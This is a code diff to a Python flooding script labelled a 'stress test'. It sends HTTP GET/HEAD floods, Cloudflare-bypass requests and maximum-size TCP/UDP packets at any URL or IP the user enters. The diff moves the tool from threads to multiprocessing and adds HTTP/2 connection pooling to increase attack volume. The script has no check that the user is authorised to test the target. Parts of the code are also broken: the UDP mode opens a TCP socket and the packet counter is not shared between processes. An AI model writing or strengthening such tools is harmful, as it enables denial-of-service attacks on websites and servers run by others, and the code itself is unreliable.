@@ -1,7 +1,7 @@
 import cloudscraper
 import httpx
 import socket
-import threading
+import multiprocessing
 import time
 from colorama import Fore, Style, init
 
@@ -12,32 +12,31 @@ print("Layer 4: tcp, udp")
 protocol = input("Enter the method to use:")
 
 if protocol in ["get", "head", "cfb"]:
-    
     url = input("Enter the website URL (including http or https): ")
 elif protocol in ["tcp", "udp"]:
-    
     ip = input("Enter the IP address of the server: ")
     port = int(input("Enter the port number: "))
-    
-num_threads = int(input("Enter the number of threads to use: "))
 
+num_processes = int(input("Enter the number of processes to use: "))
+num_connections = int(input("Enter the number of connections to use: "))
 duration = int(input("Enter the duration of the stress test in seconds: "))
 
 if protocol == "udp":
     packet_size = 65507 # Maximum size for a UDP packet
 elif protocol == "tcp":
     packet_size = 65535 # Maximum size for a TCP packet
- 
-packet_counter = 0
-packet_counter_lock = threading.Lock()
 
-def stress_test(thread_id):
+packet_counter = 0
+packet_counter_lock = multiprocessing.Lock()
+
+def stress_test():
     global packet_counter
 
     if protocol == "cfb":
         client = cloudscraper.create_scraper()
     elif protocol in ["get", "head"]:
-        client = httpx.Client()
+        limits = httpx.Limits(max_connections=num_connections, max_keepalive_connections=num_connections)
+        client = httpx.Client(http2=True, limits=limits)
     elif protocol in ["tcp", "udp"]:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     else:
@@ -46,7 +45,7 @@ def stress_test(thread_id):
 
     start_time = time.time()
     last_print_time = start_time - 9
-    if thread_id == 0:
+    if multiprocessing.current_process().name == 'MainProcess':
         if protocol in ["get", "head", "cfb"]:
             print(Fore.YELLOW + f"Stress testing started on {url} successfully!" + Style.RESET_ALL)
         elif protocol in ["tcp", "udp"]:
@@ -60,7 +59,7 @@ def stress_test(thread_id):
             send_packet(sock)
             with packet_counter_lock:
                 packet_counter += 1
-        if thread_id == 0 and time.time() - last_print_time >= 10:
+        if multiprocessing.current_process().name == 'MainProcess' and time.time() - last_print_time >= 10:
             with packet_counter_lock:
                 if protocol in ["get", "head", "cfb"]:
                     try:
@@ -95,13 +94,13 @@ def send_packet(sock):
     except Exception as e:
         pass 
 
-threads = []
-for i in range(num_threads):
-    thread = threading.Thread(target=stress_test, args=(i,))
-    thread.start()
-    threads.append(thread)
+processes = []
+for i in range(num_processes):
+    process = multiprocessing.Process(target=stress_test)
+    process.start()
+    processes.append(process)
 
-for thread in threads:
-    thread.join()
+for process in processes:
+    process.join()
 
 print(Fore.YELLOW + "Stress test ended." + Style.RESET_ALL)
